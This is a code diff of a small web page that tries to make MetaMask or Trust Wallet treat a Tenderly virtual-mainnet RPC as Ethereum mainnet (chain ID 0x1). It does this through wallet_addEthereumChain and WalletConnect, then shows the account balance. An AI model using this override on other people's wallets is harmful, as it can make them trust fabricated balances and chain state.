@@ -4,43 +4,65 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Override Ethereum Mainnet</title>
+  <script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider"></script>
 </head>
 <body>
   <h1>Override Ethereum Mainnet with Custom RPC</h1>
   <button onclick="overrideEthereumMainnet()">Override Mainnet</button>
+  <button onclick="connectWallet()">Connect Wallet</button>
 
   <script>
-    // Your Custom Ethereum RPC Details
-    const customNetwork = {
-        chainId: '0x1',  // Ethereum Mainnet Chain ID (Hexadecimal for 1)
-        chainName: 'Custom Ethereum Network',
-        rpcUrls: ['https://virtual.mainnet.rpc.tenderly.co/b9310f1f-843b-47cf-aad6-354180199c6d'],  // Update with your custom RPC URL
-        nativeCurrency: { name: 'Ethereum', symbol: 'ETH', decimals: 18 },
-        blockExplorerUrls: ['https://etherscan.io']  // Can be replaced with custom explorer if needed
-    };
+    // Custom Ethereum RPC for Trust Wallet
+    const customRPC = 'https://virtual.mainnet.rpc.tenderly.co/b9310f1f-843b-47cf-aad6-354180199c6d';
 
-    // Override Ethereum Mainnet
     async function overrideEthereumMainnet() {
         try {
             if (window.ethereum) {
-                const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
+                const chainId = await window.ethereum.request({ method: 'eth_chainId' });
 
-                // Check if we are on Ethereum Mainnet (Chain ID 1) and override it with the custom RPC
-                if (currentChainId === '0x1') {
+                if (chainId === '0x1') {  // If on Mainnet
                     await window.ethereum.request({
                         method: 'wallet_addEthereumChain',
-                        params: [customNetwork]
+                        params: [{
+                            chainId: '0x1',
+                            chainName: 'Custom Ethereum Mainnet',
+                            rpcUrls: [customRPC],
+                            nativeCurrency: { name: 'Ethereum', symbol: 'ETH', decimals: 18 },
+                            blockExplorerUrls: ['https://etherscan.io']
+                        }]
                     });
-                    alert('Ethereum Mainnet has been overridden with your custom RPC!');
+                    alert('Ethereum Mainnet overridden with your custom RPC!');
                 } else {
-                    alert('You are already on a different network.');
+                    alert('Already on a different network.');
                 }
             } else {
-                alert('Please install MetaMask or Trust Wallet.');
+                alert('Install MetaMask or Trust Wallet.');
             }
         } catch (error) {
-            console.error('Error overriding Ethereum mainnet:', error);
-            alert('Failed to override Ethereum mainnet. Please check the configuration.');
+            console.error('Error overriding mainnet:', error);
+            alert('Override failed. Check console.');
+        }
+    }
+
+    // WalletConnect - Force Trust Wallet to use Custom RPC
+    async function connectWallet() {
+        try {
+            const provider = new WalletConnectProvider({
+                rpc: { 1: customRPC }
+            });
+
+            await provider.enable();
+            const web3 = new Web3(provider);
+            const accounts = await web3.eth.getAccounts();
+            alert(`Connected: ${accounts[0]}`);
+
+            const balanceWei = await web3.eth.getBalance(accounts[0]);
+            const balanceEth = web3.utils.fromWei(balanceWei, 'ether');
+            alert(`Balance: ${balanceEth} ETH`);
+        } catch (error) {
+            console.error('Wallet connection failed:', error);
+            alert('Connection failed. Check console.');
         }
     }
   </script>
